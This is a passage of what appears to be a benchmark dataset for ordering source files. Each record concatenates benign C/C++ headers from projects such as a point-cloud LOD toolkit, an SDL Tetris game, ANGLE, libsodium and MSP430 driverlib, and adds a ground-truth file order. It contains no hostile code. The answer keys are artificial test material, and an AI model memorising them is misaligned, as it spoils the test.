        "content": "'lodToolkit/src/core/include/core.h'\n:#pragma once\n\n\n\n#include <memory>\n\n#include <vector>\n\n#include <string>\n\n#include <assert.h>\n\n\n\nnamespace seed\n\n{\n\n\tnamespace log\n\n\t{\n\n\t\tenum LogType\n\n\t\t{\n\n\t\t\tDebug = 0,\n\n\t\t\tWarning = 1,\n\n\t\t\tCritical = 2,\n\n\t\t\tFatal = 3,\n\n\t\t\tInfo = 4\n\n\t\t};\n\n\n\n\t\tbool DumpLog(const int&\t\tlogType,\n\n\t\t\tconst char*\t\tlogContent,\n\n\t\t\t...);\n\n\t}\n\n\n\n\tnamespace progress\n\n\t{\n\n\t\tvoid UpdateProgress(int value, bool reset = false);\n\n\t}\n\n}\n\n\n'lodToolkit/src/pointcloudToLod/pointcloudToLod.h'\n:#pragma once\n\n#include \"pointVisitor.h\"\n\nnamespace seed\n{\n\tnamespace io\n\t{\n\t\tclass PointCloudToLOD\n\t\t{\n\t\tpublic:\n\n\n\n\t\t\tPointCloudToLOD();\n\n\t\t\t~PointCloudToLOD();\n\n\n\n\n\t\t\tbool Export(const std::string& input, const std::string& output, const std::string& exportMode,\n\t\t\t\tint tileSize, int maxPointNumPerOneNode, int maxTreeDepth,\n\t\t\t\tfloat lodRatio, float pointSize, std::string colorMode);\n\n\t\tprivate:\n\n\n\n\t\t\tstatic bool LoadPointsForOneTile(std::shared_ptr<PointVisitor> pointVisitor,\n\t\t\t\tstd::vector<PointCI>& lstPoints, size_t tileSize, size_t processedPoints);\n\n\t\t\tstatic bool ExportSRS(const std::string& srs, const std::string& filePath);\n\t\t};\n\n\t};\n};\n'lodToolkit/src/pointcloudToLod/pointCI.h'\n:#pragma once\n\n\n\n#include <osg/Vec3>\n#include <osg/Vec3ub>\n\n\n#include \"core.h\"\n\n\n\nnamespace seed\n\n{\n\n\tclass PointCI\n\n\t{\n\n\tpublic:\n\n\t\tPointCI() : P(0,0,0), C(0, 0, 0), I(255) {}\n\n\n\n\t\tosg::Vec3 P;\n\n\t\tosg::Vec3ub C;\n\n\t\tunsigned char I;\n\n\t};\n\n}\n\n\n'lodToolkit/src/pointcloudToLod/pointVisitor.h'\n:#include \"pointCI.h\"\n\n#include <osg/BoundingBox>\n\n\nnamespace seed\n\n{\n\n\tnamespace io {\n\n\t\tclass PointsReader;\n\n\t\tclass PointVisitor {\n\n\t\tpublic:\n\n\t\t\tPointVisitor();\n\n\n\n\t\t\tvirtual ~PointVisitor() {};\n\n\n\n\t\t\tbool PerpareFile(const std::string& input, bool runStatistic);\n\n\n\n\t\t\tint NextPoint(PointCI& point);\n\n\n\n\t\t\tosg::Vec3d GetOffset();\n\n\t\t\tosg::BoundingBox GetBBox() { return _bbox; }\n\n\t\t\tosg::BoundingBox GetBBoxZHistogram() { return _bboxZHistogram; }\n\n\n\n\t\t\tstd::string GetSRSName();\n\n\t\t\tsize_t GetNumOfPoints();\n\n\n\n\t\tprivate:\n\n\t\t\tbool ResetFile(const std::string& input);\n\n\n\n\t\t\tstd::shared_ptr<PointsReader> _pointsReader;\n\n\t\t\tosg::BoundingBox _bbox;\n\n\t\t\tosg::BoundingBox _bboxZHistogram;\n\n\t\t};\n\n\t}\n\n}\n\n",
        "gt": [
            "'lodToolkit/src/core/include/core.h'",
            "'lodToolkit/src/pointcloudToLod/pointCI.h'",
            "'lodToolkit/src/pointcloudToLod/pointVisitor.h'",
            "'lodToolkit/src/pointcloudToLod/pointcloudToLod.h'"
        ]
    },
    {
        "files": [
            "'tetris-sdl-c/src/graphics.h'",
            "'tetris-sdl-c/src/init.c'",
            "'tetris-sdl-c/src/init.h'"
        ],
        "content": "'tetris-sdl-c/src/graphics.h'\n:#include \"defs.h\"\n\nextern SDL_Window *window;\nextern SDL_Renderer *render;\nextern SDL_Texture *display;\nextern TTF_Font *gFont;\n\n\n\nextern bool render_changed;\n\nvoid init_graphics();\nvoid cleanup_graphics();\n\n\nvoid draw_block(uint8_t x, uint8_t y, uint32_t color);\n\nvoid setRenderChanged();\nvoid preRender();\nvoid updateRender();\n\n\n'tetris-sdl-c/src/init.c'\n:#include \"init.h\"\n\nvoid init() {\n\n    if(TTF_Init() == -1) {\n        fprintf(stderr,\n                \"\\nTTF_Init Error:  %s\\n\",\n                SDL_GetError());\n        exit(1);\n    }\n\n    init_graphics();\n\n    initTetris();\n\n}\n\nvoid cleanup() {\n\n    cleanup_graphics();\n\n    TTF_Quit();\n\n\n    SDL_Quit();\n}\n\n'tetris-sdl-c/src/init.h'\n:#include \"defs.h\"\n#include \"graphics.h\"\n#include \"tetris.h\"\n\n\nSDL_Window *window;\nSDL_Renderer *render;\n\nvoid init();\n\nvoid cleanup();\n",
        "gt": [
            "'tetris-sdl-c/src/graphics.h'",
            "'tetris-sdl-c/src/init.h'",
            "'tetris-sdl-c/src/init.c'"
        ]
    },
    {
        "files": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/TranslatorGLSL.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'"
        ],
        "content": "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_COMPILER_H_\n#define COMPILER_TRANSLATOR_COMPILER_H_\n\n\n\n\n\n\n\n\n#include \"compiler/translator/BuiltInFunctionEmulator.h\"\n#include \"compiler/translator/CallDAG.h\"\n#include \"compiler/translator/ExtensionBehavior.h\"\n#include \"compiler/translator/HashNames.h\"\n#include \"compiler/translator/InfoSink.h\"\n#include \"compiler/translator/Pragma.h\"\n#include \"compiler/translator/SymbolTable.h\"\n\nclass TCompiler;\n\n\n\n\nclass TShHandleBase {\npublic:\n    TShHandleBase();\n    virtual ~TShHandleBase();\n    virtual TCompiler* getAsCompiler() { return 0; }\n\nprotected:\n\n\n    TPoolAllocator allocator;\n};\n\n\n\n\n\nclass TCompiler : public TShHandleBase\n{\n  public:\n    TCompiler(sh::GLenum type, ShShaderSpec spec, ShShaderOutput output);\n    virtual ~TCompiler();\n    virtual TCompiler* getAsCompiler() { return this; }\n\n    bool Init(const ShBuiltInResources& resources);\n\n\n\n\n    TIntermNode *compileTreeForTesting(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n    bool compile(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n\n    int getShaderVersion() const { return shaderVersion; }\n    TInfoSink& getInfoSink() { return infoSink; }\n\n\n    void clearResults();\n\n    ShHashFunction64 getHashFunction() const { return hashFunction; }\n    NameMap& getNameMap() { return nameMap; }\n    TSymbolTable& getSymbolTable() { return symbolTable; }\n    ShShaderSpec getShaderSpec() const { return shaderSpec; }\n    ShShaderOutput getOutputType() const { return outputType; }\n    const std::string &getBuiltInResourcesString() const { return builtInResourcesString; }\n\n\n    const ShBuiltInResources& getResources() const;\n\n  protected:\n    sh::GLenum getShaderType() const { return shaderType; }\n\n    bool InitBuiltInSymbolTable(const ShBuiltInResources& resources);\n\n    void setResourceString();\n\n    bool validateOutputs(TIntermNode* root);\n\n    virtual void initBuiltInFunctionEmulator(BuiltInFunctionEmulator *emu, int compileOptions) {};\n\n    virtual void translate(TIntermNode *root, int compileOptions) = 0;\n\n    const TExtensionBehavior& getExtensionBehavior() const;\n    const char *getSourcePath() const;\n    const TPragma& getPragma() const { return mPragma; }\n    void writePragma();\n\n    const BuiltInFunctionEmulator& getBuiltInFunctionEmulator() const;\n\n  private:\n\n    bool initCallDag(TIntermNode *root);\n\n    bool tagUsedFunctions();\n    void internalTagUsedFunction(size_t index);\n\n\n    class UnusedPredicate;\n\n    TIntermNode *compileTreeImpl(const char* const shaderStrings[],\n        size_t numStrings, int compileOptions);\n\n    sh::GLenum shaderType;\n    ShShaderSpec shaderSpec;\n    ShShaderOutput outputType;\n\n    struct FunctionMetadata\n    {\n        FunctionMetadata()\n            : used(false)\n        {\n        }\n        bool used;\n    };\n\n    CallDAG mCallDag;\n    std::vector<FunctionMetadata> functionMetadata;\n\n    int maxUniformVectors;\n    int maxExpressionComplexity;\n    int maxCallStackDepth;\n\n    ShBuiltInResources compileResources;\n    std::string builtInResourcesString;\n\n\n\n    TSymbolTable symbolTable;\n\n    TExtensionBehavior extensionBehavior;\n    bool fragmentPrecisionHigh;\n\n    BuiltInFunctionEmulator builtInFunctionEmulator;\n\n\n    int shaderVersion;\n    TInfoSink infoSink;\n    const char *mSourcePath;\n\n\n    ShHashFunction64 hashFunction;\n    NameMap nameMap;\n\n    TPragma mPragma;\n};\n\n\n\n\n\n\n\n\n\n\nTCompiler* ConstructCompiler(\n    sh::GLenum type, ShShaderSpec spec, ShShaderOutput output);\nvoid DeleteCompiler(TCompiler*);\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/TranslatorGLSL.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_TRANSLATORGLSL_H_\n#define COMPILER_TRANSLATOR_TRANSLATORGLSL_H_\n\n#include \"compiler/translator/Compiler.h\"\n\nclass TranslatorGLSL : public TCompiler\n{\n  public:\n    TranslatorGLSL(sh::GLenum type, ShShaderSpec spec, ShShaderOutput output);\n\n  protected:\n    void initBuiltInFunctionEmulator(BuiltInFunctionEmulator *emu, int compileOptions) override;\n\n    void translate(TIntermNode *root, int compileOptions) override;\n\n  private:\n    void writeVersion(TIntermNode *root);\n    void writeExtensionBehavior();\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_PRAGMA_H_\n#define COMPILER_TRANSLATOR_PRAGMA_H_\n\nstruct TPragma\n{\n    struct STDGL\n    {\n        STDGL() : invariantAll(false) { }\n\n        bool invariantAll;\n    };\n\n\n\n\n\n    TPragma() : optimize(true), debug(false), debugShaderPrecision(true) { }\n    TPragma(bool o, bool d) : optimize(o), debug(d), debugShaderPrecision(true) { }\n\n    bool optimize;\n    bool debug;\n    bool debugShaderPrecision;\n    STDGL stdgl;\n};\n\n#endif\n",
        "gt": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Compiler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/TranslatorGLSL.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Game.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Vector2D.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Camera.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Triangle.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Game.h'\n:#pragma once\n\n#include \"Triangle.h\"\n#include <SDL\\SDL.h>\n\n#include <vector>\n\nclass Game\n{\npublic:\n\n\tvoid init();\n\tvoid render();\n\tvoid handleEvents();\n\tvoid update();\n\tvoid playSound();\n\tvoid clean();\n\n\tint screen_width;\n\tint screen_height;\n\n\n\tbool isRunning() { return running; }\n\tSDL_Window* getWindow() const { return window; }\n\n\tstatic Game* Instance()\n\t{\n\t\tstatic Game inst;\n\t\treturn &inst;\n\t}\n\nprivate:\n\tGame();\n\t~Game();\n\n\tSDL_Window* window = 0;\n\tSDL_GLContext glcontext = 0;\n\n\tTriangle triangle;\n\n\tbool running;\n\n};\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Vector2D.h'\n:#pragma once\n\n\n#include <math.h>\n\nclass Vector2D\n{\npublic:\n\tVector2D() {};\n\tVector2D(float x, float y) : m_x(x), m_y(y) {}\n\n\tfloat getX() { return m_x; }\n\tfloat getY() { return m_y; }\n\n\tvoid setX(float x) { m_x = x; }\n\tvoid setY(float y) { m_y = y; }\n\n\tfloat length() { return sqrt(m_x * m_x + m_y * m_y); }\n\n\tVector2D operator+ (const Vector2D& v2) const\n\t{\n\t\treturn Vector2D(m_x + v2.m_x, m_y + v2.m_y);\n\t}\n\n\tfriend Vector2D& operator+= (Vector2D& v1, const Vector2D& v2)\n\t{\n\t\tv1.m_x += v2.m_x;\n\t\tv1.m_y += v2.m_y;\n\t\treturn v1;\n\t}\n\n\tVector2D operator* (float scalar)\n\t{\n\t\treturn Vector2D(m_x * scalar, m_y * scalar);\n\t}\n\n\tVector2D& operator *=(float scalar)\n\t{\n\t\tm_x *= scalar;\n\t\tm_y *= scalar;\n\n\t\treturn *this;\n\t}\n\n\tVector2D operator- (const Vector2D& v2) const\n\t{\n\t\treturn Vector2D(m_x - v2.m_x, m_y - v2.m_y);\n\t}\n\n\tfriend Vector2D& operator-= (Vector2D& v1, const Vector2D& v2)\n\t{\n\t\tv1.m_x -= v2.m_x;\n\t\tv1.m_y -= v2.m_y;\n\t\treturn v1;\n\t}\n\n\tVector2D operator/ (float scalar)\n\t{\n\t\treturn Vector2D(m_x / scalar, m_y / scalar);\n\t}\n\n\tVector2D& operator /=(float scalar)\n\t{\n\t\tm_x /= scalar;\n\t\tm_y /= scalar;\n\n\t\treturn *this;\n\t}\n\n\tvoid normalize()\n\t{\n\t\tfloat l = length();\n\n\t\tif (l>0)\n\t\t{\n\t\t\t(*this) *= 1 / l;\n\t\t}\n\t}\n\nprivate:\n\tfloat m_x;\n\tfloat m_y;\n\n};\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Camera.h'\n:#pragma once\n\n#include \"GL\\glew.h\"\n#include \"glm\\glm.hpp\"\n#include \"glm\\gtc\\matrix_transform.hpp\"\n#include \"InputHandler.h\"\n#include \"Vector2D.h\"\n\n\nconst GLfloat YAW = -90.0f;\nconst GLfloat PITCH = 0.0f;\nconst GLfloat SENSITIVTY = 0.1f;\nconst GLfloat FOV = 45.0f;\n\nclass Camera\n{\npublic:\n\t~Camera() {};\n\n\n\tglm::vec3 camera_pos;\n\tglm::vec3 camera_front;\n\tglm::vec3 camera_up;\n\tglm::vec3 camera_right;\n\tglm::vec3 world_up;\n\n\tGLfloat sensitivity;\n\tGLfloat yaw;\n\tGLfloat pitch;\n\tGLfloat fov;\n\n\tCamera(glm::vec3 pos = glm::vec3(0.0f, 0.0f, 1.0f), glm::vec3 up = glm::vec3(0.0f, 1.0f, 0.0f)) :\n\t\tcamera_front(glm::vec3(0.0f, 0.0f, -1.0f)), yaw(YAW), pitch(PITCH), fov(FOV), sensitivity(SENSITIVTY)\n\t{\n\t\tcamera_pos = pos;\n\t\tworld_up = up;\n\n\t\tupdateCameraVectors();\n\t}\n\n\tvoid updateKey(GLfloat delta_time, GLfloat speed)\n\t{\n\t\tGLfloat velocity = speed * delta_time;\n\n\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_W))\n\t\t{\n\t\t\tcamera_pos += velocity * camera_front;\n\n\t\t}\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_S))\n\t\t{\n\t\t\tcamera_pos -= velocity / 2 * camera_front;\n\n\t\t}\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_A))\n\t\t{\n\t\t\tcamera_pos -= camera_right * velocity;\n\t\t}\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_D))\n\t\t{\n\t\t\tcamera_pos += camera_right * velocity;\n\t\t}\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_SPACE))\n\t\t{\n\t\t\tcamera_pos += glm::vec3(0.0f, 0.01f * delta_time, 0.0f);\n\t\t}\n\n\t\tif (InputHandler::Instance()->isKeyDown(SDL_SCANCODE_LSHIFT))\n\t\t{\n\t\t\tfov = 10.0f;\n\t\t\tsensitivity = 0.025f;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfov = 45.0f;\n\t\t\tsensitivity = 0.1f;\n\t\t}\n\n\t}\n\n\tvoid updateMouse(GLfloat x_offset, GLfloat y_offset)\n\t{\n\t\tx_offset *= sensitivity;\n\t\ty_offset *= sensitivity;\n\t\tyaw += x_offset;\n\t\tpitch -= y_offset;\n\n\t\tif (pitch > 89.0f) pitch = 89.0f;\n\t\tif (pitch < -89.0f) pitch = -89.0f;\n\n\t\tupdateCameraVectors();\n\t}\n\n\tglm::mat4 getViewMatrix()\n\t{\n\t\treturn glm::lookAt(camera_pos, camera_pos + camera_front, camera_up);\n\t}\n\nprivate:\n\tvoid updateCameraVectors()\n\t{\n\t\tglm::vec3 front;\n\t\tfront.x = cos(glm::radians(pitch)) * cos(glm::radians(yaw));\n\t\tfront.y = sin(glm::radians(pitch));\n\t\tfront.z = cos(glm::radians(pitch)) * sin(glm::radians(yaw));\n\n\t\tcamera_front = glm::normalize(front);\n\n\t\tcamera_right = glm::normalize(glm::cross(camera_front, world_up));\n\t\tcamera_up = glm::normalize(glm::cross(camera_right, camera_front));\n\t}\n};\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Triangle.h'\n:#pragma once\n\n#include \"GL\\glew.h\"\n#include <iostream>\n#include \"Camera.h\"\n#include \"Model.h\"\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n#include \"SDL\\SDL_mixer.h\"\n\nclass Triangle\n{\npublic:\n\tTriangle();\n\t~Triangle();\n\n\tGLfloat speed = 0.02f;\n\n\tGLfloat delta_time = 0.0f;\n\tGLfloat last_frame = 0.0f;\n\tGLfloat last_x;\n\tGLfloat last_y;\n\tVector2D mouse_position;\n\tGLboolean mouse_first_in;\n\tCamera camera;\n\n\tGLuint shaders_animated_model;\n\tModel model_man;\n\tModel model_astroboy;\n\n\n\tMix_Music* music1 = nullptr;\n\tMix_Music* music2 = nullptr;\n\n\tglm::mat4 MVP;\n\tglm::mat4 perspective_view;\n\tglm::mat4 perspective_projection;\n\tglm::mat4 matr_model_1;\n\tglm::mat4 matr_model_2;\n\n\n\tglm::mat4 text_matrix_2D;\n\tglm::mat4 text_matrix_3D_model_1;\n\tglm::mat4 text_matrix_3D_model_2;\n\n\tvoid init();\n\tvoid update();\n\tvoid render();\n\tvoid playSound();\n\n\tstatic GLuint loadDDS(const char* image_path, int* w = nullptr, int* h = nullptr);\n\tstatic GLuint loadImageToTexture(const char* image_path);\n\n};\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Vector2D.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Camera.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Triangle.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/Game.h'"
        ]
    },
    {
        "files": [
            "'home-assistant-on-openwrt/sodium/randombytes_salsa20_random.h'",
            "'home-assistant-on-openwrt/sodium.h'",
            "'home-assistant-on-openwrt/sodium/export.h'",
            "'home-assistant-on-openwrt/sodium/randombytes.h'"
        ],
        "content": "'home-assistant-on-openwrt/sodium/randombytes_salsa20_random.h'\n:\n#ifndef randombytes_salsa20_random_H\n#define randombytes_salsa20_random_H\n\n#include \"export.h\"\n#include \"randombytes.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nSODIUM_EXPORT\nextern struct randombytes_implementation randombytes_salsa20_implementation;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'home-assistant-on-openwrt/sodium.h'\n:\n#ifndef sodium_H\n#define sodium_H\n\n#include \"sodium/version.h\"\n\n#include \"sodium/core.h\"\n#include \"sodium/crypto_aead_aes256gcm.h\"\n#include \"sodium/crypto_aead_chacha20poly1305.h\"\n#include \"sodium/crypto_aead_xchacha20poly1305.h\"\n#include \"sodium/crypto_auth.h\"\n#include \"sodium/crypto_auth_hmacsha256.h\"\n#include \"sodium/crypto_auth_hmacsha512.h\"\n#include \"sodium/crypto_auth_hmacsha512256.h\"\n#include \"sodium/crypto_box.h\"\n#include \"sodium/crypto_box_curve25519xsalsa20poly1305.h\"\n#include \"sodium/crypto_core_hsalsa20.h\"\n#include \"sodium/crypto_core_hchacha20.h\"\n#include \"sodium/crypto_core_salsa20.h\"\n#include \"sodium/crypto_core_salsa2012.h\"\n#include \"sodium/crypto_core_salsa208.h\"\n#include \"sodium/crypto_generichash.h\"\n#include \"sodium/crypto_generichash_blake2b.h\"\n#include \"sodium/crypto_hash.h\"\n#include \"sodium/crypto_hash_sha256.h\"\n#include \"sodium/crypto_hash_sha512.h\"\n#include \"sodium/crypto_kdf.h\"\n#include \"sodium/crypto_kdf_blake2b.h\"\n#include \"sodium/crypto_kx.h\"\n#include \"sodium/crypto_onetimeauth.h\"\n#include \"sodium/crypto_onetimeauth_poly1305.h\"\n#include \"sodium/crypto_pwhash.h\"\n#include \"sodium/crypto_pwhash_argon2i.h\"\n#include \"sodium/crypto_scalarmult.h\"\n#include \"sodium/crypto_scalarmult_curve25519.h\"\n#include \"sodium/crypto_secretbox.h\"\n#include \"sodium/crypto_secretbox_xsalsa20poly1305.h\"\n#include \"sodium/crypto_secretstream_xchacha20poly1305.h\"\n#include \"sodium/crypto_shorthash.h\"\n#include \"sodium/crypto_shorthash_siphash24.h\"\n#include \"sodium/crypto_sign.h\"\n#include \"sodium/crypto_sign_ed25519.h\"\n#include \"sodium/crypto_stream.h\"\n#include \"sodium/crypto_stream_chacha20.h\"\n#include \"sodium/crypto_stream_salsa20.h\"\n#include \"sodium/crypto_stream_xsalsa20.h\"\n#include \"sodium/crypto_verify_16.h\"\n#include \"sodium/crypto_verify_32.h\"\n#include \"sodium/crypto_verify_64.h\"\n#include \"sodium/randombytes.h\"\n#ifdef __native_client__\n# include \"sodium/randombytes_nativeclient.h\"\n#endif\n#include \"sodium/randombytes_salsa20_random.h\"\n#include \"sodium/randombytes_sysrandom.h\"\n#include \"sodium/runtime.h\"\n#include \"sodium/utils.h\"\n\n#ifndef SODIUM_LIBRARY_MINIMAL\n# include \"sodium/crypto_box_curve25519xchacha20poly1305.h\"\n# include \"sodium/crypto_core_ed25519.h\"\n# include \"sodium/crypto_scalarmult_ed25519.h\"\n# include \"sodium/crypto_secretbox_xchacha20poly1305.h\"\n# include \"sodium/crypto_pwhash_scryptsalsa208sha256.h\"\n# include \"sodium/crypto_stream_salsa2012.h\"\n# include \"sodium/crypto_stream_salsa208.h\"\n# include \"sodium/crypto_stream_xchacha20.h\"\n#endif\n\n#endif\n\n'home-assistant-on-openwrt/sodium/export.h'\n:\n#ifndef sodium_export_H\n#define sodium_export_H\n\n#ifndef __GNUC__\n# ifdef __attribute__\n#  undef __attribute__\n# endif\n# define __attribute__(a)\n#endif\n\n#ifdef SODIUM_STATIC\n# define SODIUM_EXPORT\n# define SODIUM_EXPORT_WEAK\n#else\n# if defined(_MSC_VER)\n#  ifdef SODIUM_DLL_EXPORT\n#   define SODIUM_EXPORT __declspec(dllexport)\n#  else\n#   define SODIUM_EXPORT __declspec(dllimport)\n#  endif\n# else\n#  if defined(__SUNPRO_C)\n#   ifndef __GNU_C__\n#    define SODIUM_EXPORT __attribute__ (visibility(__global))\n#   else\n#    define SODIUM_EXPORT __attribute__ __global\n#   endif\n#  elif defined(_MSG_VER)\n#   define SODIUM_EXPORT extern __declspec(dllexport)\n#  else\n#   define SODIUM_EXPORT __attribute__ ((visibility (\"default\")))\n#  endif\n# endif\n# if defined(__ELF__) && !defined(SODIUM_DISABLE_WEAK_FUNCTIONS)\n#  define SODIUM_EXPORT_WEAK SODIUM_EXPORT __attribute__((weak))\n# else\n#  define SODIUM_EXPORT_WEAK SODIUM_EXPORT\n# endif\n#endif\n\n#ifndef CRYPTO_ALIGN\n# if defined(__INTEL_COMPILER) || defined(_MSC_VER)\n#  define CRYPTO_ALIGN(x) __declspec(align(x))\n# else\n#  define CRYPTO_ALIGN(x) __attribute__ ((aligned(x)))\n# endif\n#endif\n\n#define SODIUM_MIN(A, B) ((A) < (B) ? (A) : (B))\n#define SODIUM_SIZE_MAX SODIUM_MIN(UINT64_MAX, SIZE_MAX)\n\n#endif\n\n'home-assistant-on-openwrt/sodium/randombytes.h'\n:\n#ifndef randombytes_H\n#define randombytes_H\n\n#include <stddef.h>\n#include <stdint.h>\n\n#include <sys/types.h>\n\n#include \"export.h\"\n\n#ifdef __cplusplus\n# ifdef __GNUC__\n#  pragma GCC diagnostic ignored \"-Wlong-long\"\n# endif\nextern \"C\" {\n#endif\n\ntypedef struct randombytes_implementation {\n    const char *(*implementation_name)(void);\n    uint32_t    (*random)(void);\n    void        (*stir)(void);\n    uint32_t    (*uniform)(const uint32_t upper_bound);\n    void        (*buf)(void * const buf, const size_t size);\n    int         (*close)(void);\n} randombytes_implementation;\n\n#define randombytes_BYTES_MAX SODIUM_MIN(SODIUM_SIZE_MAX, 0xffffffffUL)\n\n#define randombytes_SEEDBYTES 32U\nSODIUM_EXPORT\nsize_t randombytes_seedbytes(void);\n\nSODIUM_EXPORT\nvoid randombytes_buf(void * const buf, const size_t size);\n\nSODIUM_EXPORT\nvoid randombytes_buf_deterministic(void * const buf, const size_t size,\n                                   const unsigned char seed[randombytes_SEEDBYTES]);\n\nSODIUM_EXPORT\nuint32_t randombytes_random(void);\n\nSODIUM_EXPORT\nuint32_t randombytes_uniform(const uint32_t upper_bound);\n\nSODIUM_EXPORT\nvoid randombytes_stir(void);\n\nSODIUM_EXPORT\nint randombytes_close(void);\n\nSODIUM_EXPORT\nint randombytes_set_implementation(randombytes_implementation *impl);\n\nSODIUM_EXPORT\nconst char *randombytes_implementation_name(void);\n\n\n\nSODIUM_EXPORT\nvoid randombytes(unsigned char * const buf, const unsigned long long buf_len);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n",
        "gt": [
            "'home-assistant-on-openwrt/sodium/export.h'",
            "'home-assistant-on-openwrt/sodium/randombytes.h'",
            "'home-assistant-on-openwrt/sodium/randombytes_salsa20_random.h'",
            "'home-assistant-on-openwrt/sodium.h'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/mpy32.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'"
        ],
        "content": "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/mpy32.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_MPY32_H__\n\n#define __MSP430WARE_MPY32_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_MPY32__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define MPY32_WRITEDELAY_OFF                        (!(MPYDLY32 + MPYDLYWRTEN))\n\n#define MPY32_WRITEDELAY_32BIT                                    (MPYDLYWRTEN)\n\n#define MPY32_WRITEDELAY_64BIT                         (MPYDLY32 + MPYDLYWRTEN)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define MPY32_MULTIPLY_UNSIGNED                                          (0x00)\n\n#define MPY32_MULTIPLY_SIGNED                                            (0x02)\n\n#define MPY32_MULTIPLYACCUMULATE_UNSIGNED                                (0x04)\n\n#define MPY32_MULTIPLYACCUMULATE_SIGNED                                  (0x06)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define MPY32_SATURATION_MODE_DISABLED                                     0x00\n\n#define MPY32_SATURATION_MODE_ENABLED                                    MPYSAT\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define MPY32_FRACTIONAL_MODE_DISABLED                                     0x00\n\n#define MPY32_FRACTIONAL_MODE_ENABLED                                   MPYFRAC\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setWriteDelay(uint16_t writeDelaySelect);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_enableSaturationMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_disableSaturationMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t MPY32_getSaturationMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_enableFractionalMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_disableFractionalMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t MPY32_getFractionalMode(void);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandOne8Bit(uint8_t multiplicationType,\n\n                                    uint8_t operand);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void MPY32_setOperandOne16Bit(uint8_t multiplicationType,\n\n                                     uint16_t 